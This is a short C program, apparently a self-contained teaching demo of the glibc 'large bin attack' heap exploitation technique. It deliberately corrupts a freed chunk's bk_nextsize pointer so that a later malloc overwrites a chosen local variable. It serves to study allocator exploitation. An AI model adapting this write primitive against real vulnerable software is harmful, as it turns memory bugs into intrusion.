#include <stdio.h>
#include <stdlib.h>
#include "malloc_struct.h"

int main(void){
	void *ma, *mb;
	malloc_chunk *ca, *cb;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	ma = malloc(0x428);	// A
	ca = mem2chunk(ma);
	malloc(0);
	mb = malloc(0x418);	// B
	cb = mem2chunk(mb);
	printf("ma = %p, mb = %p\nca = %p, cb = %p\n\n"
		, ma, mb, ca, cb);

	free(ma);		// to unsorted
	malloc(0x438);		// (A : unsorted -> large)

	puts("Exploit!");
	ca->bk_nextsize = ((void*)&var) - 0x20;	// vuln

	free(mb);		// to unsorted
	malloc(0x438);		// (B : unsorted -> large)

	printf("var = %#lx\n", var);
}
